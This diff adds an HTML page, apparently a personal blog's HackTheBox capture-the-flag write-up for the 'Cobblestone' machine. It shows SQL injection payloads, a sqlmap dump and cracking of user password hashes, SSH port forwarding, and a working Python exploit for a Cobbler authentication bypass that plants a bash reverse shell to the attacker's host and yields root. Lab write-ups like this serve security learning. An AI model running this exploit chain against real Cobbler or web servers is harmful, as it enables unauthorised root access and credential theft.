@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Cobblestone</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Insane · Linux</span>
+  <h1>Cobblestone</h1>
+  <div class="subtitle">HackTheBox</div>
+  <div class="tags">
+    <span class="tag">SQL Injection</span>
+    <span class="tag">File-Write Primitive</span>
+    <span class="tag">RCE</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">Recon</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">SQL Injection</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">File-Write Primitive</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">RCE</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Part 1: Register &amp; Login via cURL</h2></div>
+
+    <p><strong>Step 1: Extract Form Field Names</strong></p>
+    <pre><code>curl -s http://vote.cobblestone.htb/login.php -o login.html
+cat login.html | grep -i -A2 "input\|form"</code></pre>
+    <p><strong>Output (relevant fields):</strong></p>
+    <pre><code>&lt;form method="POST" action="register.php"&gt;
+    &lt;input type="text" class="form-control" id="registerUsername" name="username" ... required&gt;
+    &lt;input type="text" class="form-control" id="registerFirst" name="first" ... required&gt;
+    &lt;input type="text" class="form-control" id="registerLast" name="last" ... required&gt;
+    &lt;input type="email" class="form-control" id="registerEmail" name="email" ... required&gt;
+    &lt;input type="password" class="form-control" id="registerPassword" name="password" ... required&gt;
+&lt;/form&gt;</code></pre>
+    <p><strong>Why:</strong> We need the exact <code>name=</code> attributes to craft the POST request. The form posts to <code>register.php</code>.</p>
+
+    <p><strong>Step 2: Register Account</strong></p>
+    <pre><code>curl -s -X POST http://vote.cobblestone.htb/register.php \
+  -d 'username=burrito&amp;first=burrito&amp;last=burrito&amp;email=burrito@cobblestone.htb&amp;password=Test1234!'</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>(empty - but form was processed, server redirects after POST)</code></pre>
+    <p><strong>Why empty?</strong> The <code>/register.php</code> endpoint returns a 302 redirect after successful registration. No body content is shown. This is normal.</p>
+
+    <p><strong>Step 3: Login &amp; Save Session Cookie</strong></p>
+    <pre><code>curl -s -c cookies.txt -X POST http://vote.cobblestone.htb/login_verify.php \
+  -d 'username=burrito&amp;password=Test1234!' -L</code></pre>
+    <p><strong>Explanation:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>-c cookies.txt</code> &rarr; Save cookies to file</li>
+      <li><code>-L</code> &rarr; Follow redirects</li>
+      <li><code>login_verify.php</code> &rarr; The login endpoint (found in earlier form inspection)</li>
+    </ul>
+    <p><strong>Verify the cookie:</strong></p>
+    <pre><code>cat cookies.txt</code></pre>
+    <p><strong>Expected Output:</strong></p>
+    <pre><code># Netscape HTTP Cookie File
+# This is a generated file!  Do not edit.
+
+.vote.cobblestone.htb	TRUE	/	FALSE	&lt;expiry&gt;	PHPSESSID	&lt;session_id_here&gt;</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Reading a form's exact field names before scripting against it is a small step that avoids most of the guesswork in automating web-app interaction.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Part 2: SQL Injection in Suggest Form</h2></div>
+
+    <p><strong>Step 4: Test for SQL Injection</strong></p>
+    <pre><code>curl -s -b cookies.txt -X POST http://vote.cobblestone.htb/suggest.php \
+  -d "url=test' OR '1'='1" -L</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>&lt;html&gt;&lt;head&gt;&lt;redirect to /details.php?id=91&gt;&lt;/head&gt;&lt;/html&gt;</code></pre>
+    <p><strong>Analysis:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Normal input would show voting page</li>
+      <li>Our payload caused a redirect to <code>details.php</code> with an ID</li>
+      <li>This means the query executed differently &rarr; <mark class="rust">SQL injection confirmed</mark></li>
+    </ul>
+
+    <p><strong>Step 5: Determine Column Count</strong></p>
+    <pre><code>curl -s -b cookies.txt -X POST http://vote.cobblestone.htb/suggest.php \
+  -d "url=test' ORDER BY 5 -- -" -L</code></pre>
+    <pre><code>(redirect to details.php?id=100 - SUCCESS)</code></pre>
+    <p><strong>Try 6 columns:</strong></p>
+    <pre><code>curl -s -b cookies.txt -X POST http://vote.cobblestone.htb/suggest.php \
+  -d "url=test' ORDER BY 6 -- -" -L</code></pre>
+    <pre><code>(error - 6 columns don't exist)</code></pre>
+    <p><strong>Conclusion:</strong> The query has <strong>exactly 5 columns</strong></p>
+
+    <p><strong>Step 6: Create Request File for SQLMap</strong></p>
+    <pre><code># First get your actual PHPSESSID
+PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')
+
+cat > request.txt &lt;&lt; EOF
+POST /suggest.php HTTP/1.1
+Host: vote.cobblestone.htb
+Content-Length: 23
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=$PHPSESSID
+
+url=test
+EOF</code></pre>
+    <p><strong>Verify the file:</strong></p>
+    <pre><code>cat request.txt</code></pre>
+    <pre><code>POST /suggest.php HTTP/1.1
+Host: vote.cobblestone.htb
+Content-Length: 23
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=&lt;your_session_id&gt;
+
+url=test</code></pre>
+    <div class="why"><strong>Why this mattered</strong>A redirect target that changes based on injected boolean logic is just as reliable a signal as a visible error message — automated tools aren't required to notice SQL injection, just a systematic pass through common payloads.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Part 3: Database Enumeration with SQLMap</h2></div>
+
+    <p><strong>Step 7: Confirm Injection &amp; List Databases</strong></p>
+    <pre><code>sqlmap -r request.txt -p url --dbs --batch</code></pre>
+    <pre><code>[*] starting @ 00:22:03 /2026-07-09/
+[INFO] parsing HTTP request from 'request.txt'
+[INFO] resuming back-end DBMS 'mysql' 
+[INFO] testing connection to the target URL
+got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=104'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+
+[INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+available databases [2]:
+[*] information_schema
+[*] vote</code></pre>
+    <p><strong>Analysis:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Database is <strong>MariaDB</strong> (MySQL fork)</li>
+      <li>Two databases: <code>information_schema</code> (system) and <code>vote</code> (application)</li>
+      <li>We care about the <code>vote</code> database</li>
+    </ul>
+
+    <p><strong>Step 8: Dump vote Database Users Table</strong></p>
+    <pre><code>sqlmap -r request.txt -p url -D vote -T users --dump --batch --no-cast</code></pre>
+    <pre><code>[*] starting @ 00:22:03 /2026-07-09/
+[INFO] parsing HTTP request from 'request.txt'
+[INFO] resuming back-end DBMS 'mysql' 
+[INFO] testing connection to the target URL
+got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=104'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+
+Parameter: url (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: url=test' AND 1296=1296 AND 'hXBi'='hXBi
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: url=test' AND (SELECT 5176 FROM (SELECT(SLEEP(5)))euUD) AND 'cewz'='cewz
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: url=-1022' UNION ALL SELECT CONCAT(0x71716a7671,0x56504b596a534c6b666a51646f6e4b70447a48534d577a775556734241526175716f74496d697456,0x716b6a6a71),NULL,NULL,NULL,NULL-- -
+
+[INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[INFO] fetching columns for table 'users' in database 'vote'
+[INFO] fetching entries for table 'users' in database 'vote'
+
+Database: vote
+Table: users
+[2 entries]
++----+-------------------------+----------+---------------------------------------------------------------+----------+-----------+
+| id | Email                   | LastName | Password                                                       | Username | FirstName |
++----+-------------------------+----------+---------------------------------------------------------------+----------+-----------+
+| 1  | cobble@cobblestone.htb  |          | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86   | admin    | Admin     |
+| 10 | burrito@cobblestone.htb | burrito  | $2y$10$PjWyfblg0FsU4ELoZH9UEeMPuL3GZ7wCrpj9nVHdhVfeJX1p26vhq   | burrito  | burrito   |
++----+-------------------------+----------+---------------------------------------------------------------+----------+-----------+
+
+[INFO] table 'vote.users' dumped to CSV file '/home/burrito/.local/share/sqlmap/output/vote.cobblestone.htb/dump/vote/users.csv'
+[*] ending @ 00:22:05 /2026-07-09/</code></pre>
+    <p><strong>Key Finding:</strong></p>
+    <pre><code>Email: cobble@cobblestone.htb
+Username: admin
+Password Hash: $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86
+Hash Type: bcrypt ($2y$)</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Part 4: Crack the Hash</h2></div>
+
+    <p><strong>Step 9: Save Hash to File</strong></p>
+    <pre><code>echo '$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86' > hash.txt</code></pre>
+    <p><strong>Verify:</strong></p>
+    <pre><code>cat hash.txt</code></pre>
+    <pre><code>$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86</code></pre>
+
+    <p><strong>Step 10: Crack with Hashcat</strong></p>
+    <pre><code>echo '$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86' > hash.txt
+
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+    <p><strong>Result:</strong></p>
+    <pre><code>$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86 : &lt;password&gt;</code></pre>
+    <p><strong>Password:</strong> <mark class="green"><code>&lt;password&gt;</code></mark></p>
+    <div class="why"><strong>Why this mattered</strong>Application-layer password hashes are worth cracking even when they look "strong" (bcrypt) — the algorithm's cost doesn't help if the underlying password is still weak.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Part 5: SSH Access as cobble</h2></div>
+
+    <p><strong>Step 11: SSH Login</strong></p>
+    <pre><code>ssh cobble@cobblestone.htb</code></pre>
+    <p><strong>Prompt:</strong></p>
+    <pre><code>The authenticity of host 'cobblestone.htb (&lt;TARGET_IP&gt;)' can't be established.
+ED25519 key fingerprint is SHA256:c5Fpg/cgHQO2EmwqsW3VtYIVXXMz7nz8dwjibC8n0gw.
+This key is not known to any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])?</code></pre>
+    <p><strong>Type:</strong> <code>yes</code></p>
+    <pre><code>cobble@cobblestone.htb's password:</code></pre>
+    <p><strong>Enter:</strong> <code>&lt;password&gt;</code></p>
+    <p><strong>Successful Login Output:</strong></p>
+    <pre><code>Linux cobblestone 6.1.0-47-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.170-3 (2026-05-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+your exact distribution terms are described in the individual files
+in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+cobble@cobblestone:~$</code></pre>
+
+    <p><strong>Step 12: Capture User Flag</strong></p>
+    <pre><code>cat ~/user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Part 6: Privilege Escalation</h2></div>
+
+    <p><strong>Step 13: Enumerate Running Services</strong></p>
+    <pre><code>ss -tulnp</code></pre>
+    <pre><code>Netid      State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process     
+udp        UNCONN      0           0                      0.0.0.0:68                   0.0.0.0:*                    
+udp        UNCONN      0           0                      0.0.0.0:69                   0.0.0.0:*                    
+tcp        LISTEN      0           80                   127.0.0.1:3306                 0.0.0.0:*                    
+tcp        LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*                    
+tcp        LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*                    
+tcp        LISTEN      0           5                    127.0.0.1:25151                0.0.0.0:*       (Cobbler!)
+tcp        LISTEN      0           128                       [::]:22                      [::]:*</code></pre>
+    <p><strong>Key Finding:</strong> <mark>Port 25151 listening locally (Cobbler XML-RPC service)</mark></p>
+
+    <p><strong>Step 14: Port Forward Cobbler from Kali</strong></p>
+    <p>On Kali, open new terminal:</p>
+    <pre><code>ssh -N -L 25151:localhost:25151 cobble@cobblestone.htb</code></pre>
+    <p><strong>Enter password:</strong> <code>&lt;password&gt;</code></p>
+    <p><strong>Output:</strong> (hangs silently - this is correct, tunnel is active)</p>
+    <pre><code>(stays open, no output = tunnel ready)</code></pre>
+
+    <p><strong>Step 15: Identify Cobbler Version</strong></p>
+    <p>On Kali, in another terminal:</p>
+    <pre><code>curl -s -H "Content-Type: text/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;version&lt;/methodName&gt;&lt;params/&gt;&lt;/methodCall&gt;' \
+  http://127.0.0.1:25151</code></pre>
+    <pre><code>&lt;?xml version='1.0'?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;double&gt;3.306&lt;/double&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;</code></pre>
+    <p><strong>Version:</strong> 3.3.6 — <mark class="rust">Vulnerable to CVE-2024-47533</mark></p>
+    <div class="why"><strong>Why this mattered</strong>Provisioning and infrastructure-automation tools often run with very high privilege by necessity — an authentication bypass in one of them is close to the worst-case outcome, since their entire job is executing configuration as root.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Step 16: Create Exploit Script</h2></div>
+    <pre><code>cat > exploit_rce.py &lt;&lt; 'EOF'
+import xmlrpc.client
+
+TARGET = "http://127.0.0.1:25151"
+LHOST, LPORT = "&lt;kali vpn&gt;", "443"  # Your Kali IP
+
+# Cheetah template with reverse shell
+payload = f"""#set $null = __import__('os').system('bash -c "bash -i >&amp; /dev/tcp/{LHOST}/{LPORT} 0>&amp;1"')
+lang en_US
+keyboard us
+network --bootproto=dhcp
+rootpw  --plaintext cobbler
+timezone UTC
+bootloader --location=mbr
+clearpart --all --initlabel
+autopart
+reboot
+"""
+
+s = xmlrpc.client.ServerProxy(TARGET)
+
+# CVE-2024-47533: Auth bypass with empty username and -1 password
+t = s.login("", -1)
+print("[+] Auth bypass successful, got token")
+
+# Write malicious template
+s.write_autoinstall_template("pwn.ks", payload, t)
+print("[+] Malicious template written")
+
+# CREATE DISTRO FIRST
+print("[+] Creating distro...")
+did = s.new_distro(t)
+s.modify_distro(did, "name", "pwn_distro", t)
+s.modify_distro(did, "arch", "x86_64", t)
+s.modify_distro(did, "breed", "redhat", t)
+s.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-47-amd64", t)
+s.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-47-amd64", t)
+s.save_distro(did, t)
+print("[+] Distro created")
+
+# Create profile
+pid = s.new_profile(t)
+s.modify_profile(pid, "name", "pwnprof", t)
+print("[+] New profile created")
+
+# Link distro to profile
+s.modify_profile(pid, "distro", "pwn_distro", t)
+s.modify_profile(pid, "autoinstall", "pwn.ks", t)
+s.modify_profile(pid, "kickstart", "pwn.ks", t)
+s.save_profile(pid, t)
+print("[+] Profile modified and saved")
+
+# Trigger rendering (RCE)
+print("[+] Triggering payload...")
+result = s.generate_profile_autoinstall("pwnprof")
+print("[+] Payload executed!")
+EOF</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">08</span><h2>Step 17: Start Listener &amp; Run Exploit</h2></div>
+    <p><strong>Terminal A (listener):</strong></p>
+    <pre><code>nc -lnvp 443</code></pre>
+    <pre><code>listening on [any] 443 ...</code></pre>
+
+    <p><strong>Terminal B (exploit):</strong></p>
+    <pre><code>python3 exploit_rce.py</code></pre>
+    <pre><code>[+] Auth bypass successful, got token
+[+] Malicious template written
+[+] Creating distro...
+[+] Distro created
+[+] New profile created
+[+] Profile modified and saved
+[+] Triggering payload...
+[+] Payload executed!</code></pre>
+
+    <p><strong>Terminal A (receives shell):</strong></p>
+    <pre><code>connect to [&lt;kali vpn&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 48548
+bash: cannot set terminal process group (946): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cobblestone:/#</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">09</span><h2>Step 18: Capture Root Flag</h2></div>
+    <p><strong>In root shell:</strong></p>
+    <pre><code>cat /root/root.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+  </div>
+
+  <div class="stage">
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
